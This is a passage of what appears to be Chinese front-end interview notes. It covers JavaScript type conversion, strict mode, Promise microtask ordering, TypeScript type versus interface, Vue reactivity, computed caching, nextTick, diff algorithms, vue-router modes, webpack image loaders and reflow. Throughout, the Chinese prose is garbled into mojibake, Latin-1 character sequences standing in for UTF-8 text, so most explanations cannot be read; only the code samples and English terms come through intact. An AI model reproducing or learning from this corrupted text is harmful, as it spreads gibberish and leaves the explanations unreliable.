`String`æ–¹æ³•èƒŒåçš„è½¬æ¢è§„åˆ™ï¼Œä¸`Number`æ–¹æ³•åŸºæœ¬ç›¸åŒï¼Œåªæ˜¯äº’æ¢äº†`valueOf`æ–¹æ³•å’Œ`toString`æ–¹æ³•çš„æ‰§è¡Œé¡ºåºã€‚
```

#### éšæ€§è½¬æ¢

| ç±»å‹      | è½¬æ¢å‰    | è½¬æ¢å |
| --------- | --------- | ------ |
| number    | 4         | 4      |
| string    | "1"       | 1      |
| string    | ""        | 0      |
| boolean   | true      | 1      |
| boolean   | false     | 0      |
| undefined | undefined | NaN    |
| null      | null      | 0      |

**è¯¦æƒ…çœ‹ä¸Šæ–¹[ğŸ‘†æ–‡ç« é“¾æ¥](https://juejin.cn/post/6956170676327677966)**

### [è™šæ‹ŸDOMï¼ˆç‚¹å‡»è·³è½¬ï¼‰](./é¢è¯•é¢˜æŠ½ç¦»/è™šæ‹ŸDOM/readme.md)

### XMLHttpRequestå’ŒFetch

#### fetch çš„ä¼˜ç¼ºç‚¹

- åŸºäº Promise å¯¹è±¡è®¾è®¡çš„ï¼Œå¯ä»¥è§£å†³å›è°ƒåœ°ç‹±é—®é¢˜
  - æ²¡æœ‰åŠæ³•æ£€æµ‹è¯·æ±‚çš„è¿›åº¦ï¼Œæ— æ³•å–æ¶ˆæˆ–è¶…æ—¶å¤„ç†

- é»˜è®¤ä¸å¸¦cookieï¼Œä½¿ç”¨æ—¶éœ€è¦è®¾ç½®ã€‚

### for in for of

#### for in ç”¨äºå¯æšä¸¾å±æ€§ï¼Œå¦‚å¯¹è±¡ã€æ•°ç»„ã€å­—ç¬¦ä¸²

```js
const obj = {name: 1}
> Object.getOwnPropertyDescriptors(obj) // è·å–ä¸€ä¸ªå¯¹è±¡çš„æ‰€æœ‰è‡ªèº«å±æ€§çš„æè¿°ç¬¦
< {
    name: {
        configurable: true,
        enumerable: true, // å¯æšä¸¾
        value: 1,
        writable: true
    }
  }
```

#### for of ç”¨äºå¯è¿­ä»£æ•°æ®ï¼Œå¦‚æ•°ç»„ã€mapã€setã€argumentsã€Nodelist

```js
const arr = [1,2]
> console.log(arr[Symbol.iterator]())
< {
    next() {}, // è¿­ä»£å™¨æ¨¡å¼
    Symbol(Symbol.toStringTag): "Array Iterator"
}
```

### ä¸¥æ ¼æ¨¡å¼

#### å…¨å±€å˜é‡å¿…é¡»å…ˆå£°æ˜

```js
// é”™è¯¯
function foo() {
  'use strict';
  x = 10; // æŠ›å‡ºé”™è¯¯ï¼šUncaught ReferenceError: x is not defined
  console.log(x);
}
foo();

// æ­£ç¡®
function foo() {
  'use strict';
  var x = 10;
  console.log(x);
}
foo(); // è¾“å‡º 10
```

#### ç¦æ­¢ä½¿ç”¨with

#### åˆ›å»º eval ä½œç”¨åŸŸ  

```js
"use strict";
var x = 12
eval('var x = 20; console.log(x)') // 20
console.log(x) // 12
```

ä¸¥æ ¼æ¨¡å¼ä¸ä¼šç¦æ­¢ä½¿ç”¨ `eval` å‡½æ•°ï¼Œä½†ä¼šé™åˆ¶å…¶ä½œç”¨åŸŸå’Œå½±å“èŒƒå›´ï¼Œä»è€Œæé«˜ä»£ç çš„å®‰å…¨æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚

#### ç¦æ­¢ this æŒ‡å‘ window

```js
function foo() {
    console.log(this)
}
foo() // undefined
```

#### å‡½æ•°å‚æ•°ä¸èƒ½é‡å 

### äº‹ä»¶å¾ªç¯

å¾®ä»»åŠ¡åœ¨ä¸‹ä¸€è½® DOM æ¸²æŸ“ä¹‹å‰æ‰§è¡Œï¼Œå®ä»»åŠ¡åœ¨ä¹‹åæ‰§è¡Œ

### preload å’Œ prefetch

preload èµ„æºåœ¨å½“å‰é¡µé¢ä½¿ç”¨ï¼Œä¼šä¼˜å…ˆåŠ è½½

prefetch èµ„æºåœ¨æœªæ¥é¡µé¢ä½¿ç”¨ï¼Œä¼šç©ºé—´åŠ è½½

```html
<link rel="preload" href="demo.css" as="style">
<link rel="preload" href="demo.js" as="script">

<link rel="prefetch" href="demo.js" as="script">
```

### dns-prefetch å’Œ preconnect

dns-prefetch DNS é¢„æŸ¥è¯¢

preconnect DNS é¢„è¿æ¥

```html
<link rel="dns-prefetch" href="https://demo.com">
<link rel="preconnect" href="https://demo.com" crossorigin>
```

### Promise

#### return *Promise*.resolve()

æ…¢2æ‹

ç¬¬ä¸€æ‹ï¼Œpromise éœ€è¦ pending å˜ä¸º fulfilled

ç¬¬äºŒæ‹ï¼Œthen å‡½æ•°æŒ‚è½½åˆ° MicroTaskQueue ( å‚è€ƒ Event Loopï¼‰

è¾“å‡ºï¼š 1 100 200 300 2 400 3 500 4 5

```js
  Promise.resolve().then(() => {
    console.log(1)
    return Promise.resolve(2)
  }).then((res) => {
    console.log(res)
  }).then(() => {
    console.log(3)
  }).then(() => {
    console.log(4)
  }).then(() => {
    console.log(5)
  })

  Promise.resolve().then(() => {
    console.log(100)
  }).then(() => {
    console.log(200)
  }).then(() => {
    console.log(300)
  }).then(() => {
    console.log(400)
  }).then(() => {
    console.log(500)
  })
```



## TypeScript

### typeå’Œinterfaceçš„åŒºåˆ«

ä¸åŒç‚¹

1. ç»§æ‰¿ interfaceæ˜¯é€šè¿‡extendså®ç°çš„ï¼Œtypeæ˜¯é€šè¿‡&å®ç°çš„ã€‚
2. typeå¯ä»¥å®šä¹‰ åŸºæœ¬ç±»å‹çš„åˆ«åï¼Œå¦‚ type myString = string
3. typeå¯ä»¥é€šè¿‡ typeof æ“ä½œç¬¦æ¥å®šä¹‰ï¼Œå¦‚ type myType = typeof someObj
4. typeå¯ä»¥ç”³æ˜ è”åˆç±»å‹ï¼Œå¦‚ type unionType = myType1 | myType2
5. typeå¯ä»¥ç”³æ˜ å…ƒç»„ç±»å‹ï¼Œå¦‚ type yuanzu = [myType1, myType2]
6. interfaceå¯ä»¥ **å£°æ˜åˆå¹¶**   å¦‚æœæ˜¯typeçš„è¯ï¼Œå°±ä¼šæŠ¥ **é‡å¤å®šä¹‰** çš„è­¦å‘Š

```tsx
interface test {
    name: string
}
 
interface test {
    age: number
}

```

## Vue

### inputåŒå‘äº‹ä»¶ç»‘å®š v-model çš„å®ç°åŸç†

ç­”æ¡ˆï¼šé€šè¿‡ input å…ƒç´ çš„ value = this.name

ç»‘å®š input äº‹ä»¶ this.name = $event.target.value

data æ›´æ–°è§¦å‘ re-render

### [vueä¸­8ç§ç»„ä»¶é€šä¿¡æ–¹å¼,](https://juejin.cn/post/6844903887162310669)

props  emit

$children $parent   vue3ç”¨refsè·å–children

provide inject

ref refs

eventBus vue3 ä¸èƒ½new Vueï¼ˆï¼‰å¯ä»¥ç”¨ç¬¬ä¸‰æ–¹åº“æ¯”å¦‚mitt

Vuex Pinia

$attrs $listeners  vue3æ²¡æœ‰listeners  æ‰€æœ‰éƒ½åŒ…æ‹¬åœ¨äº†attrsé‡Œäº†

### Ajax è¯·æ±‚åº”è¯¥æ”¾åœ¨å“ªä¸ªç”Ÿå‘½å‘¨æœŸ

åœ¨createdçš„æ—¶å€™ï¼Œè§†å›¾ä¸­çš„domå¹¶æ²¡æœ‰è¢«æ¸²æŸ“å‡ºæ¥ï¼Œæ‰€ä»¥æ­¤æ—¶å¦‚æœç›´æ¥å»æ“ä½œdomèŠ‚ç‚¹ï¼Œæ— æ³•æ‰¾åˆ°ç›¸å…³å…ƒç´ ã€‚
åœ¨mountedä¸­ï¼Œç”±äºæ­¤æ—¶çš„domå…ƒç´ å·²ç»æ¸²æŸ“å‡ºæ¥äº†ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨domèŠ‚ç‚¹ã€‚

å¯ä»¥åœ¨é’©å­å‡½æ•° createdã€beforeMountã€mounted ä¸­è¿›è¡Œè°ƒç”¨ï¼Œå› ä¸ºåœ¨è¿™ä¸‰ä¸ªé’©å­å‡½æ•°ä¸­ï¼Œdata å·²ç»åˆ›å»ºï¼Œå¯ä»¥å°†æœåŠ¡ç«¯ç«¯è¿”å›çš„æ•°æ®è¿›è¡Œèµ‹å€¼ã€‚ä½†æ˜¯æœ¬äººæ¨èåœ¨ created é’©å­å‡½æ•°ä¸­è°ƒç”¨å¼‚æ­¥è¯·æ±‚ï¼Œå› ä¸ºåœ¨ created é’©å­å‡½æ•°ä¸­è°ƒç”¨å¼‚æ­¥è¯·æ±‚æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š

- èƒ½æ›´å¿«è·å–åˆ°æœåŠ¡ç«¯æ•°æ®ï¼Œå‡å°‘é¡µé¢ loading æ—¶é—´ï¼›
- ssr ä¸æ”¯æŒ beforeMount ã€mounted é’©å­å‡½æ•°ï¼Œæ‰€ä»¥æ”¾åœ¨ created ä¸­æœ‰åŠ©äºä¸€è‡´æ€§ï¼›

### ä½•æ—¶éœ€è¦ä½¿ç”¨ beforeDestroyï¼Ÿ

ç­”æ¡ˆï¼š

- è§£é™¤è‡ªå®šä¹‰äº‹ä»¶ event.$off
- æ¸…é™¤å®šæ—¶å™¨
- è§£ç»‘è‡ªå®šä¹‰çš„ DOM äº‹ä»¶ï¼Œå¦‚ window scrollç­‰

### vuexéœ€è¦æ³¨æ„çš„ç‚¹

### vuex ä¸­ action å’Œ mutationæœ‰ä½•åŒºåˆ«ï¼Ÿ

ç­”æ¡ˆï¼š

- action ä¸­å¤„ç†å¼‚æ­¥ï¼Œmutation ä¸å¯ä»¥
- mutation åšåŸå­æ“ä½œ
- action å¯ä»¥æ•´åˆå¤šä¸ª mutation

### å¤šä¸ªç»„ä»¶æœ‰ç›¸åŒé€»è¾‘ï¼Œå¦‚ä½•æŠ½ç¦»ï¼Ÿ

ç­”æ¡ˆï¼š ç”¨ mixin, mixin çš„ä¸€äº›ç¼ºç‚¹

mixin çš„ç”¨æ³•ï¼šï¼›å®šä¹‰ä¸€ä¸ª jsæ–‡ä»¶å°†export default ä¸­çš„å…±æœ‰å†…å®¹å†™åˆ°é‡Œé¢ï¼Œç„¶ååœ¨ç»„ä»¶ä¸­importï¼Œæ”¾åˆ° mixinæ•°ç»„ä¸­

mixin çš„ä¸€äº›ç¼ºç‚¹ï¼š

1. å˜é‡æ¥æºä¸æ˜ï¼Œä¸åˆ©äºé˜…è¯»ã€‚æˆ‘ä»¬å¸Œæœ›ç¼–ç¨‹çº¢çš„å˜é‡å’Œæ–¹æ³•æ˜¯å¯æŸ¥æ‰¾çš„ï¼Œä½†æ˜¯ mixin å¼•å…¥çš„å†…å®¹ç¼–è¾‘æ˜¯ä¸å¯å¯»æ‰¾
2. å¤šmixin å¯èƒ½é€ æˆå‘½åå†²çª
3. è¿·ä¿¡å’Œç»„ä»¶å¯èƒ½å‡ºç°å¤šå¯¹å¤šçš„å…³ç³»ï¼ˆä¸€ä¸ªç»„ä»¶å¼•ç”¨å¤šä¸ª mixin, ä¸€ä¸ªmixinè¢«å¤šä¸ªç»„ä»¶å¼•ç”¨ï¼‰ï¼Œå¤æ‚åº¦è¾ƒé«˜ã€‚å¤šå¯¹å¤šæ˜¯æœ€å¤æ‚çš„å…³ç³»ï¼Œå¾ˆå®¹æ˜“å‰ªä¸æ–­ç†è¿˜ä¹±

åœ¨vue3 æå‡ºçš„ Composition API æ—¨åœ¨è§£å†³è¿™äº›é—®é¢˜

### Vue å¦‚ä½•æ£€æµ‹æ•°ç»„æ›´æ–°

`Vue` å†…éƒ¨é‡å†™æ•°ç»„åŸå‹é“¾ï¼Œå½“æ•°ç»„å‘ç”Ÿå˜åŒ–æ—¶ï¼Œé™¤äº†æ‰§è¡ŒåŸç”Ÿçš„æ•°ç»„æ–¹æ³•å¤–ï¼Œè¿˜ä¼šè°ƒç”¨ `dep.notify` é€šçŸ¥ `Watcher` æ›´æ–°ã€‚è§¦å‘æ•°ç»„æ›´æ–°çš„æ–¹æ³•å…±7ç§ï¼š

- `push`
- `pop`
- `shift`
- `unshift`
- `splice`
- `sort`
- `reverse`

å¦‚æœæˆ‘ç›´æ¥æ ¹æ®ç´¢å¼•å»ä¿®æ”¹æ•°ç»„ï¼Œè§†å›¾ä¼šæ›´æ–°å—ï¼Ÿ

é‚£ä¸ºä»€ä¹ˆè¿™å‡ ä¸ªæ–¹æ³•å¯ä»¥åšåˆ°æ•°æ®æ›´æ–°è§†å›¾æ›´æ–°å‘¢ï¼Ÿ Vueæ˜¯æ€ä¹ˆå®ç°çš„

è°ƒç”¨æ›´æ–°è§†å›¾çš„æ–¹æ³• ç„¶åæ¯”å¦‚.callå•¥çš„è°ƒç”¨ä¸€ä¸‹åŸç”Ÿçš„Arrayçš„æ–¹æ³•

### vue-routerçš„åŸç†

`vue-router` åŸç†æ˜¯æ›´æ–°è§†å›¾è€Œä¸é‡æ–°è¯·æ±‚é¡µé¢ã€‚`vue-router` å…±æœ‰3ç§æ¨¡å¼ï¼š**hashæ¨¡å¼**ã€**historyæ¨¡å¼**ã€**abstractæ¨¡å¼**ã€‚

hashæ¨¡å¼

`hash` æ¨¡å¼ä½¿ç”¨ `hashchange` ç›‘å¬åœ°å€æ çš„ `hash` å€¼çš„å˜åŒ–ï¼ŒåŠ è½½å¯¹åº”çš„é¡µé¢ã€‚æ¯æ¬¡çš„ `hash` å€¼å˜åŒ–åä¾ç„¶ä¼šåœ¨æµè§ˆå™¨ç•™ä¸‹å†å²è®°å½•ï¼Œå¯ä»¥é€šè¿‡æµè§ˆå™¨çš„å‰è¿›åé€€æŒ‰é’®å›åˆ°ä¸Šä¸€ä¸ªé¡µé¢ã€‚

historyæ¨¡å¼

`history` æ¨¡å¼åŸºäºHistory Apiå®ç°ï¼Œä½¿ç”¨ `popstate` ç›‘å¬åœ°å€æ çš„å˜åŒ–ã€‚ä½¿ç”¨ `pushState` å’Œ `replaceState` ä¿®æ”¹ urlï¼Œè€Œæ— éœ€åŠ è½½é¡µé¢ã€‚ä½†æ˜¯åœ¨åˆ·æ–°é¡µé¢æ—¶è¿˜æ˜¯ä¼šå‘åç«¯å‘èµ·è¯·æ±‚ï¼Œéœ€è¦åç«¯é…åˆå°†èµ„æºå®šå‘å›å‰ç«¯ï¼Œäº¤ç”±å‰ç«¯è·¯ç”±å¤„ç†ã€‚

### abstract

ä¸æ¶‰åŠå’Œæµè§ˆå™¨åœ°å€çš„ç›¸å…³è®°å½•ã€‚é€šè¿‡æ•°ç»„ç»´æŠ¤æ¨¡æ‹Ÿæµè§ˆå™¨çš„å†å²è®°å½•æ ˆã€‚

### æƒé™æ§åˆ¶

### ä»€ä¹ˆæ˜¯é˜²æŠ–ï¼Œä»€ä¹ˆæ˜¯èŠ‚æµï¼Œå¦‚ä½•å®ç°é˜²æŠ–

### v-forä¹‹åçš„keyçš„ä½œç”¨æ˜¯ä»€ä¹ˆ

ç­”æ¡ˆï¼šå¿…é¡»è¦ç”¨ key, è€Œä¸”ä¸èƒ½ç”¨ index å’Œ randomï¼Œ

keyæ˜¯vueä¸­vnodeçš„å”¯ä¸€æ ‡è®°ï¼Œé€šè¿‡è¿™ä¸ªkeyï¼Œæˆ‘ä»¬çš„diffæ“ä½œå¯ä»¥æ›´å‡†ç¡®ï¼Œæ›´å¿«é€Ÿ

åœ¨ diff ç®—æ³•ä¸­ç”¨ tag å’Œ keyæ¥åˆ¤æ–­ï¼Œæ˜¯å¦æ˜¯sameNode

å¯ä»¥å‡å°‘æ¸²æŸ“æ¬¡æ•°ï¼Œæé«˜æ¸²æŸ“æ€§èƒ½

ä»‹ç»ä¸€ä¸‹è™šæ‹ŸDOM

è™šæ‹Ÿ`DOM`æœ¬è´¨å°±æ˜¯ç”¨ä¸€ä¸ªåŸç”Ÿçš„`JavaScript`å¯¹è±¡å»æè¿°ä¸€ä¸ª`DOM`èŠ‚ç‚¹ã€‚æ˜¯å¯¹çœŸå®`DOM`çš„ä¸€å±‚æŠ½è±¡ã€‚

ç”±äºåœ¨æµè§ˆå™¨ä¸­æ“ä½œ`DOM`æ˜¯å¾ˆæ˜‚è´µçš„ã€‚é¢‘ç¹çš„æ“ä½œ`DOM`ï¼Œä¼šäº§ç”Ÿä¸€å®šçš„æ€§èƒ½é—®é¢˜ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è¿™ä¸€å±‚æŠ½è±¡ï¼Œåœ¨`patch`è¿‡ç¨‹ä¸­å°½å¯èƒ½åœ°ä¸€æ¬¡æ€§å°†å·®å¼‚æ›´æ–°åˆ°`DOM`ä¸­ï¼Œè¿™æ ·ä¿è¯äº†`DOM`ä¸ä¼šå‡ºç°æ€§èƒ½å¾ˆå·®çš„æƒ…å†µã€‚

å¦å¤–è¿˜æœ‰å¾ˆé‡è¦çš„ä¸€ç‚¹ï¼Œä¹Ÿæ˜¯å®ƒçš„è®¾è®¡åˆè¡·ï¼Œä¸ºäº†æ›´å¥½çš„è·¨å¹³taiï¼Œæ¯”å¦‚`Node.js`å°±æ²¡æœ‰`DOM`,å¦‚æœæƒ³å®ç°`SSR`(æœåŠ¡ç«¯æ¸²æŸ“),é‚£ä¹ˆä¸€ä¸ªæ–¹å¼å°±æ˜¯å€ŸåŠ©`Virtual DOM`,å› ä¸º`Virtual DOM`æœ¬èº«æ˜¯`JavaScript`å¯¹è±¡ã€‚

`Vue2.x`ä¸­çš„è™šæ‹Ÿ`DOM`ä¸»è¦æ˜¯å€Ÿé‰´äº†`snabbdom.js`ï¼Œ`Vue3`ä¸­å€Ÿé‰´`inferno.js`ç®—æ³•è¿›è¡Œä¼˜åŒ–ã€‚

### computed å’Œ watch çš„åŒºåˆ«

1. `computed` ä¾èµ– `data` çš„æ”¹å˜è€Œæ”¹å˜ï¼Œ`computed` æœ‰è¿”å›å€¼ï¼›`watch` è§‚æµ‹ `data`ï¼Œæ‰§è¡Œå¯¹åº”çš„å‡½æ•°ã€‚
2. `computed` æœ‰ç¼“å­˜åŠŸèƒ½ï¼Œé‡å¤å–å€¼ä¸ä¼šæ‰§è¡Œæ±‚å€¼å‡½æ•°ã€‚
3. `computed` ä¾èµ–æ”¶é›†åœ¨é¡µé¢æ¸²æŸ“æ—¶è§¦å‘ï¼Œ`watch` ä¾èµ–æ”¶é›†åœ¨é¡µé¢æ¸²æŸ“å‰è§¦å‘ã€‚
4. `computed` æ›´æ–°éœ€è¦â€œæ¸²æŸ“Watcherâ€çš„é…åˆï¼Œ`computed` æ›´æ–°åªæ˜¯è®¾ç½® `dirty`ï¼Œéœ€è¦é¡µé¢æ¸²æŸ“è§¦å‘ `get` é‡æ–°æ±‚å€¼

### Vue ä¸­çš„ computed æ˜¯å¦‚ä½•å®ç°ç¼“å­˜çš„

â€œè®¡ç®—å±æ€§`Watcher`â€ä¼šå¸¦æœ‰ä¸€ä¸ª `dirty` çš„å±æ€§ï¼Œåœ¨åˆå§‹åŒ–å–å€¼å®Œæˆåï¼Œä¼šå°†æ±‚å€¼ç»“æœç¼“å­˜èµ·æ¥ï¼Œå¹¶æŠŠ `dirty` è®¾ç½®ä¸º `false`ã€‚åªè¦ä¾èµ–å±æ€§ä¸æ›´æ–°ï¼Œ`dirty` æ°¸è¿œä¸º `false`ï¼Œé‡å¤å–å€¼ä¹Ÿä¸ä¼šå†å»æ‰§è¡Œæ±‚å€¼å‡½æ•°ï¼Œè€Œæ˜¯ç›´æ¥è¿”å›ç¼“å­˜ç»“æœï¼Œä»è€Œå®ç°ç¼“å­˜ã€‚ç›¸åï¼Œä¾èµ–å±æ€§æ›´æ–°ä¼šå°†â€œè®¡ç®—å±æ€§ `Watcher`â€çš„ `dirty` è®¾ç½®ä¸º `true`ï¼Œåœ¨é¡µé¢æ¸²æŸ“å¯¹è®¡ç®—å±æ€§å–å€¼æ—¶ï¼Œå†æ¬¡è§¦å‘æ±‚å€¼å‡½æ•°æ›´æ–°è®¡ç®—å±æ€§ã€‚

```js
Object.defineProperty(target, key, {
    get() {
        const watcher = this._computedWatchers && this._computedWatchers[key]
        // è®¡ç®—å±æ€§ç¼“å­˜
        if (watcher.dirty) {  
            // è®¡ç®—å±æ€§æ±‚å€¼
            watcher.evaluate()  
        }
        return watcher.value
    }
})
```

### æè¿°ä¸€ä¸‹Event Loop

### è¯´ä¸€ä¸‹ nextTick çš„åŸç†

åœ¨ä¸‹æ¬¡ dom æ›´æ–°ç»“æŸä¹‹åæ‰§è¡Œå»¶è¿Ÿå›è°ƒã€‚`nextTick` ä¸»è¦ä½¿ç”¨äº†å®ä»»åŠ¡å’Œå¾®ä»»åŠ¡ã€‚æ ¹æ®æ‰§è¡Œç¯å¢ƒåˆ†åˆ«å°è¯•é‡‡ç”¨ï¼š

- Promise
- MutationObserver
- setImmediate
- setTimeout

`nextTick` ä¸»è¦ç”¨äºå†…éƒ¨ `Watcher` çš„å¼‚æ­¥æ›´æ–°ï¼Œå¯¹å¤–æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ `Vue.nextTick` å’Œ `vm.$nextTick`ã€‚åœ¨ `nextTick` ä¸­å¯ä»¥è·å–æ›´æ–°å®Œæˆçš„ domã€‚

### å¯¹æ¯” Vue3 å’Œ Vue2.x

1. ä½¿ç”¨ `Proxy` ä»£æ›¿ `Object.defineProperty`
2. æ–°å¢ `Composition API`
3. æ¨¡æ¿å…è®¸å¤šä¸ªæ ¹èŠ‚ç‚¹

### Vue3 ä¸ºä»€ä¹ˆä½¿ç”¨ Proxy ä»£æ›¿ Object.definedProperty

`Object.definedProperty` åªèƒ½æ£€æµ‹åˆ°å±æ€§çš„è·å–å’Œè®¾ç½®ï¼Œå¯¹äºæ–°å¢å’Œåˆ é™¤æ˜¯æ²¡åŠæ³•æ£€æµ‹çš„ã€‚åœ¨æ•°æ®åˆå§‹åŒ–æ—¶ï¼Œç”±äºä¸çŸ¥é“å“ªäº›æ•°æ®ä¼šè¢«ç”¨åˆ°ï¼Œ`Vue` æ˜¯ç›´æ¥é€’å½’è§‚æµ‹å…¨éƒ¨æ•°æ®ï¼Œè¿™ä¼šå¯¼è‡´æ€§èƒ½å¤šä½™çš„æ¶ˆè€—ã€‚

`Proxy` åŠ«æŒæ•´ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡å±æ€§çš„å¢åŠ å’Œåˆ é™¤éƒ½èƒ½æ£€æµ‹åˆ°ã€‚`Proxy` å¹¶ä¸èƒ½ç›‘å¬åˆ°å†…éƒ¨æ·±å±‚çš„å¯¹è±¡å˜åŒ–ï¼Œå› æ­¤ Vue 3.0 çš„å¤„ç†æ–¹å¼æ˜¯åœ¨ `getter` ä¸­å»é€’å½’å“åº”å¼ï¼Œåªæœ‰çœŸæ­£è®¿é—®åˆ°çš„å†…éƒ¨å¯¹è±¡æ‰ä¼šå˜æˆå“åº”å¼ï¼Œè€Œä¸æ˜¯æ— è„‘é€’å½’ï¼Œåœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šæå‡äº†æ€§èƒ½ã€‚

Object.definePropertyæœ‰æ²¡æœ‰ä»€ä¹ˆä½ å·²çŸ¥çš„ä»€ä¹ˆé—®é¢˜æˆ–è€…è¯´ç¼ºç‚¹ï¼Ÿ

### [vue2 vue3 diffç®—æ³•åŒºåˆ«](https://co2-2020.github.io/blog/soundcode/vue/dom-diff.html#vue3-x-diff%E7%AE%97%E6%B3%95)

å…ˆåˆ¤æ–­ æ˜¯å¦æ˜¯åŒæ ‡ç­¾ï¼Œä¸åŒæ ‡ç­¾ç›´æ¥ä¸diffäº†ç›´æ¥æ›¿æ¢ï¼ŒåŒæ ‡ç­¾å†åˆ¤æ–­æ–‡æœ¬ï¼Œç„¶åchildrenåŸæ¥å­˜åœ¨ æ–°çš„ä¸å­˜åœ¨å°±åˆ é™¤ï¼Œä¸å­˜åœ¨ï¼Œæ–°çš„å­˜åœ¨å°±å¢åŠ ï¼Œå¦‚æœæœ¬æ¥å°±å­˜åœ¨å†è¿›è¡Œä¸‹ä¸€æ­¥çš„åˆ¤æ–­

![diff](https://github.com/zhang874010534/tuchuan/blob/main/interview/vue2-diff.png?raw=true)

vue2å¤´å¤´ å°¾å°¾ å¤´å°¾ å°¾å¤´ éƒ½ä¸è¡Œå°±ç›´æ¥è¿›è¡Œåˆ¤æ–­æ–°vnodeçš„å½“å‰èŠ‚ç‚¹å­˜åœ¨ä¸å­˜åœ¨ å­˜åœ¨å°±ç§»åŠ¨ä¸å­˜åœ¨å°±åˆ›å»ºï¼Œ

![vue3-dom-diff](https://co2-2020.github.io/blog/assets/img/vue3-dom-diff.55e5bd94.gif)

Vue3.0æ²¡æœ‰é‡‡ç”¨åŒæŒ‡é’ˆéå†çš„æ–¹å¼ï¼Œè€Œæ˜¯å•æŒ‡é’ˆå¾ªç¯ï¼Œå…ˆéå†å¤´éƒ¨èŠ‚ç‚¹ï¼Œç›´åˆ°ç¬¬ä¸€ä¸ªä¸åŒèŠ‚ç‚¹ï¼›ç„¶åå†å°¾éƒ¨éå†ï¼Œç›´åˆ°ç¬¬ä¸€ä¸ªä¸åŒçš„èŠ‚ç‚¹

å¢åŠ äº†æœ€é•¿é€’å¢å­åºåˆ—ï¼Œä»¥è¿™ä¸ªä¸ºåŸºç¡€ç¡®è®¤å…·ä½“domçš„æ“ä½œæ–¹å¼

### Promise.then

### å¹³æ—¶å¦‚ä½•å»åšæ€§èƒ½ä¼˜åŒ–çš„

### Vue å¸¸è§æ€§èƒ½ä¼˜åŒ–æ–¹å¼

ç­”æ¡ˆï¼š

- åˆç†ä½¿ç”¨v-show å’Œ v-if
- åˆç†ä½¿ç”¨computed
- v-for æ—¶è¦åŠ keyï¼Œä»¥åŠé¿å…å’Œ v-if åŒæ—¶ä½¿ç”¨
- è‡ªå®šä¹‰äº‹ä»¶ã€DOM äº‹ä»¶åŠæ—¶é”€æ¯
- åˆç†ä½¿ç”¨å¼‚æ­¥ç»„ä»¶
- åˆç†ä½¿ç”¨keep-alive
- dataå±‚çº§ä¸è¦å¤ªæ·±ï¼ˆå› ä¸ºæ·±åº¦ç›‘å¬ä¸€æ¬¡æ€§ç›‘å¬åˆ°åº•ï¼‰
- é•¿åˆ—è¡¨ä¼˜åŒ– Object.freeze
- å›¾ç‰‡æ‡’åŠ è½½
- è·¯ç”±æ‡’åŠ è½½
- è™šæ‹Ÿåˆ—è¡¨
- ç¬¬ä¸‰æ–¹åº“çš„æŒ‰éœ€å¯¼å…¥
- ä½¿ç”¨ vue-loader åœ¨å¼€å‘ç¯å¢ƒåšæ¨¡æ¿ç¼–è¯‘ï¼ˆé¢„ç¼–è¯‘ï¼‰
- webpackå±‚é¢çš„ä¼˜åŒ–
- å‰ç«¯é€šç”¨çš„æ€§èƒ½ä¼˜åŒ–ï¼Œå¦‚æœå›¾ç‰‡æ‡’åŠ è½½
- ä½¿ç”¨ SSR

### æœ‰è‡ªå·±é…è¿‡webpackå—

### webpackä¸­å¦‚ä½•å¤„ç†å›¾ç‰‡çš„ï¼Ÿ

åœ¨`webpack`ä¸­æœ‰ä¸¤ç§å¤„ç†å›¾ç‰‡çš„`loader`ï¼š

- `file-loader`ï¼šè§£å†³`CSS`ç­‰ä¸­å¼•å…¥å›¾ç‰‡çš„è·¯å¾„é—®é¢˜ï¼›(è§£å†³é€šè¿‡`url`,`import/require()`ç­‰å¼•å…¥å›¾ç‰‡çš„é—®é¢˜)
- `url-loader`ï¼šå½“å›¾ç‰‡å°äºè®¾ç½®çš„`limit`å‚æ•°å€¼æ—¶ï¼Œ`url-loader`å°†å›¾ç‰‡è¿›è¡Œ`base64`ç¼–ç (å½“é¡¹ç›®ä¸­æœ‰å¾ˆå¤šå›¾ç‰‡ï¼Œé€šè¿‡`url-loader`è¿›è¡Œ`base64`ç¼–ç åä¼šå‡å°‘`http`è¯·æ±‚æ•°é‡ï¼Œæé«˜æ€§èƒ½)ï¼Œå¤§äºlimitå‚æ•°å€¼ï¼Œåˆ™ä½¿ç”¨`file-loader`æ‹·è´å›¾ç‰‡å¹¶è¾“å‡ºåˆ°ç¼–è¯‘ç›®å½•ä¸­ï¼›

### è¯´ä¸€ä¸‹å›æµå’Œé‡ç»˜

**å›æµ**ï¼š

è§¦å‘æ¡ä»¶ï¼š

å½“æˆ‘ä»¬å¯¹ DOM ç»“æ„çš„ä¿®æ”¹å¼•å‘ DOM å‡ ä½•å°ºå¯¸å˜åŒ–çš„æ—¶å€™ï¼Œä¼šå‘ç”Ÿ`å›æµ`çš„è¿‡ç¨‹ã€‚

ä¾‹å¦‚ä»¥ä¸‹æ“ä½œä¼šè§¦å‘å›æµï¼š

1. ä¸€ä¸ª DOM å…ƒç´ çš„å‡ ä½•å±æ€§å˜åŒ–ï¼Œå¸¸è§çš„å‡ ä½•å±æ€§æœ‰`width`ã€`height`ã€`padding`ã€`margin`ã€`left`ã€`top`ã€`border` ç­‰ç­‰, è¿™ä¸ªå¾ˆå¥½ç†è§£ã€‚
2. ä½¿ DOM èŠ‚ç‚¹å‘ç”Ÿ`å¢å‡`æˆ–è€…`ç§»åŠ¨`ã€‚
3. è¯»å†™ `offset`æ—ã€`scroll`æ—å’Œ`client`æ—å±æ€§çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¸ºäº†è·å–è¿™äº›å€¼ï¼Œéœ€è¦è¿›è¡Œå›æµæ“ä½œã€‚
4. è°ƒç”¨ `window.getComputedStyle` æ–¹æ³•ã€‚

